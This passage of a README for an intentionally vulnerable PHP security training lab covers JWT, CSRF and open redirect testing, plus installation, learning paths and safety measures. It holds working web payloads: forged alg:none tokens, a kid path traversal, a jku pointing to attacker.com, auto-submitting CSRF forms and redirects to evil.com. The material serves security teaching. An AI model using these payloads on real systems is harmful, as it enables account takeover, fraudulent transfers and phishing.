+### **Testing Methodology**
+
+#### **Step 1: alg:none Attack**
+```json
+{
+  "alg": "none",
+  "typ": "JWT"
+}
+.
+{
+  "user": "admin",
+  "role": "admin",
+  "exp": 9999999999
+}
+.
+```
+**Expected**: Token accepted without signature
+
+#### **Step 2: Weak Secret Brute Force**
+```bash
+hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+john --wordlist=rockyou.txt jwt.txt
+```
+
+#### **Step 3: KID (Key ID) Injection**
+```json
+{
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "../../../etc/passwd"
+}
+```
+
+#### **Step 4: JKU/JWK Misuse**
+```json
+{
+  "alg": "RS256",
+  "typ": "JWT",
+  "jku": "http://attacker.com/key.json"
+}
+```
+
+#### **Step 5: Signature Stripping**
+Remove signature portion:
+```
+header.payload.
+```
+
+#### **Step 6: Algorithm Confusion**
+1. Get public key
+2. Sign with HS256 using public key as secret
+3. Server verifies with RS256 public key
+
+### **Common JWT Libraries Vulnerabilities**
+
+#### **Node.js (jsonwebtoken)**
+- CVE-2015-9235 (alg:none)
+- CVE-2022-23529 (key confusion)
+
+#### **Python (PyJWT)**
+- CVE-2017-11424 (key confusion)
+- CVE-2022-29217 (validation bypass)
+
+### **Impact**
+- Authentication bypass
+- Privilege escalation
+- Account takeover
+- Session hijacking
+- Information disclosure
+
+### **Prevention**
+- Use strong, random secrets (256-bit+)
+- Reject tokens with alg:none
+- Validate all token claims
+- Use short expiration times
+- Implement proper key rotation
+- Use asymmetric cryptography (RS256)
+- Validate KID, JKU, JWK parameters
+
+---
+
+## **🔴 14. CSRF (Cross-Site Request Forgery)**
+
+### **Location**: `csrf.php`
+
+### **Vulnerability Description**
+State-changing actions can be triggered by unauthorized requests from other domains, exploiting user authentication.
+
+### **Testing Methodology**
+
+#### **Step 1: Basic CSRF Detection**
+```html
+<img src="http://bank.com/transfer?to=attacker&amount=1000">
+```
+**Expected**: Transfer occurs if user is logged in
+
+#### **Step 2: Form-based CSRF**
+```html
+<form action="http://bank.com/transfer" method="POST" id="csrf">
+  <input type="hidden" name="to" value="attacker">
+  <input type="hidden" name="amount" value="1000">
+</form>
+<script>document.getElementById('csrf').submit();</script>
+```
+
+#### **Step 3: JSON CSRF**
+```javascript
+fetch('http://api.example.com/update', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({email: 'attacker@evil.com'})
+});
+```
+
+#### **Step 4: CSRF with SameSite Bypass**
+```javascript
+// Open popup
+var w = window.open('http://bank.com');
+setTimeout(function() {
+  w.postMessage({type: 'transfer', data: {to: 'attacker', amount: 1000}}, '*');
+}, 2000);
+```
+
+### **CSRF Protection Bypass Techniques**
+
+#### **Token Prediction**
+If tokens are predictable or reused.
+
+#### **Token Leakage**
+Steal token via XSS or referer header.
+
+#### **Request Preflight Bypass**
+Some implementations check token only for certain methods.
+
+### **Impact**
+- Unauthorized fund transfers
+- Password changes
+- Email changes
+- Account deletion
+- Privilege escalation
+- Data manipulation
+
+### **Prevention**
+- Implement CSRF tokens (synchronizer tokens)
+- Use SameSite cookie attribute
+- Implement double-submit cookie pattern
+- Require custom headers (X-Requested-With)
+- Validate Referer header
+- Use state parameter in OAuth
+- Implement re-authentication for sensitive actions
+
+---
+
+## **🔴 15. Open Redirect**
+
+### **Location**: `open_redirect.php`
+
+### **Vulnerability Description**
+Unvalidated redirects allow attackers to redirect users to malicious sites, facilitating phishing attacks.
+
+### **Testing Methodology**
+
+#### **Step 1: Basic Redirect**
+```
+?redirect=http://evil.com
+?redirect=//evil.com
+```
+
+#### **Step 2: Protocol Manipulation**
+```
+?redirect=javascript:alert(1)
+?redirect=data:text/html,<h1>Phishing</h1>
+?redirect=file:///etc/passwd
+```
+
+#### **Step 3: OAuth Redirect Abuse**
+```
+?redirect=https://evil.com&state=OAUTH_STATE
+```
+
+#### **Step 4: Double Encoding**
+```
+?redirect=http%3A%2F%2Fevil.com
+?redirect=%2F%2Fevil.com
+```
+
+#### **Step 5: Parameter Pollution**
+```
+?redirect=/dashboard&redirect=http://evil.com
+```
+
+### **Phishing Scenarios**
+
+#### **Legitimate-looking URL**
+```
+https://trusted-site.com/login?redirect=https://evil-phishing.com/login
+```
+
+#### **SSO Bypass**
+Redirect to attacker-controlled identity provider.
+
+#### **Mobile App Abuse**
+Deep links that redirect to malicious apps.
+
+### **Impact**
+- Phishing attacks
+- Credential theft
+- Malware distribution
+- Session theft
+- Trust exploitation
+- SEO spam
+
+### **Prevention**
+- Use allowlists for redirect URLs
+- Use relative URLs only
+- Implement tokenized redirects (HMAC)
+- Require user confirmation for external redirects
+- Validate redirect domains
+- Use domain allowlisting
+- Implement redirect logging
+
+---
+
+## **5. Installation & Setup**
+
+### **Requirements**
+- PHP 7.4 or higher
+- MySQL 5.7 or higher
+- Apache/NGINX web server
+- 100MB disk space
+- Modern web browser
+
+### **Installation Steps**
+
+#### **Step 1: Download and Extract**
+```bash
+git clone https://github.com/your-repo/vuln-lab.git
+cd vuln-lab
+```
+
+#### **Step 2: Configure Database**
+```bash
+mysql -u root -p < setup_database.sql
+```
+
+#### **Step 3: Update Configuration**
+Edit `config.php`:
+```php
+<?php
+$conn = mysqli_connect("localhost", "your_username", "your_password", "vulnsite");
+?>
+```
+
+#### **Step 4: Set Permissions**
+```bash
+chmod 755 uploads/
+chmod 644 *.php
+```
+
+#### **Step 5: Access Application**
+Open browser to: `http://localhost/vuln-lab/nav.php`
+
+### **Docker Installation (Alternative)**
+```dockerfile
+# Dockerfile
+FROM php:7.4-apache
+COPY . /var/www/html/
+RUN docker-php-ext-install mysqli
+EXPOSE 80
+```
+
+```bash
+docker build -t vuln-lab .
+docker run -p 8080:80 vuln-lab
+```
+
+---
+
+## **6. Educational Value**
+
+### **Learning Paths**
+
+#### **Beginner Path**
+1. Start with XSS (visual feedback)
+2. Move to SQL Injection (logical bypass)
+3. Try File Upload (file system interaction)
+4. Explore Path Traversal (file access)
+5. Attempt Command Injection (system access)
+
+#### **Intermediate Path**
+1. IDOR (access control)
+2. CSRF (state manipulation)
+3. Open Redirect (phishing)
+4. SSRF (internal network)
+5. XXE (XML parsing)
+
+#### **Advanced Path**
+1. JWT vulnerabilities (cryptographic)
+2. Deserialization (object injection)
+3. SSTI (template engines)
+4. Race Conditions (concurrency)
+5. HTTP Smuggling (protocol manipulation)
+
+### **Assessment Metrics**
+- **Completion Time**: How quickly vulnerabilities are identified
+- **Exploitation Success**: Percentage of successful exploits
+- **Prevention Knowledge**: Ability to suggest fixes
+- **Tool Usage**: Proficiency with security tools
+- **Reporting Skills**: Quality of vulnerability reports
+
+### **Integration with Security Tools**
+The lab is compatible with:
+- **Burp Suite** (Professional/Community)
+- **OWASP ZAP**
+- **SQLMap**
+- **Nikto**
+- **Nmap**
+- **Metasploit**
+- **Custom Python scripts**
+
+---
+
+## **7. Security Considerations**
+
+### **Containment Measures**
+1. **Network Isolation**: Run on localhost only
+2. **File Permissions**: Restrict write access
+3. **Database Sandboxing**: Use test database only
+4. **Process Isolation**: Run as unprivileged user
+5. **Monitoring**: Log all exploit attempts
+
+### **Legal Disclaimer**
+```
+WARNING: This application contains intentional vulnerabilities.
+It is for educational purposes only.
+
+DO NOT:
+- Deploy on public servers
+- Use against systems you don't own
+- Use for illegal activities
+- Expose to untrusted networks
+
+The developers assume no liability for misuse.
+```
+
+### **Safety Features**
+- No real data exposure
+- Contained within test environment
+- Clear warnings on each page
+- No connection to production systems
+- Educational focus emphasized
+
+---
+
+## **8. Future Enhancements**
+
+### **Planned Features**
+1. **Multi-user mode** with separate instances
+2. **Scoring system** with points for each exploit
+3. **Progress tracking** with achievements
+4. **Hint system** for difficult challenges
+5. **Automated validation** of exploit success
+6. **Mobile application** version
+7. **Dockerized deployment** options
+8. **API endpoints** for automated testing
+9. **Reporting module** for generating test reports
+10. **Integration** with security certification programs
+
+### **Advanced Vulnerability Additions**
+1. **GraphQL vulnerabilities**
+2. **WebSocket security issues**
+3. **API security flaws**
+4. **Container security vulnerabilities**
+5. **Cloud misconfigurations**
+6. **CI/CD pipeline attacks**
+7. **Supply chain attacks**
+8. **Cryptographic vulnerabilities**
+9. **Hardware security issues**
+10. **Social engineering simulations**
+
+---
+
+## **Conclusion**
+
+The **Vulnerable Security Training Lab** provides a comprehensive, hands-on learning environment for web application security. With 16+ carefully implemented vulnerabilities, clear testing guides, and educational content, it serves as an ideal platform for:
+
+1. **Security education** - Learn how vulnerabilities work in practice
+2. **Penetration testing practice** - Hone skills in a safe environment
+3. **Developer training** - Understand security from a defensive perspective
+4. **Security tool testing** - Validate security scanners and tools
+5. **CTF preparation** - Practice for cybersecurity competitions
+
+By combining realistic vulnerabilities with detailed exploitation guides and prevention advice, this project bridges the gap between theoretical security knowledge and practical application skills.
+
+**Remember**: With great power comes great responsibility. Use this knowledge to build more secure applications, not to break them.
+
+---
+
+**Project Status**: Active Development  
+**Version**: 2.0  
+**Last Updated**: December 2024  
+**License**: Educational Use Only  
+**Contact**: Security Training Team
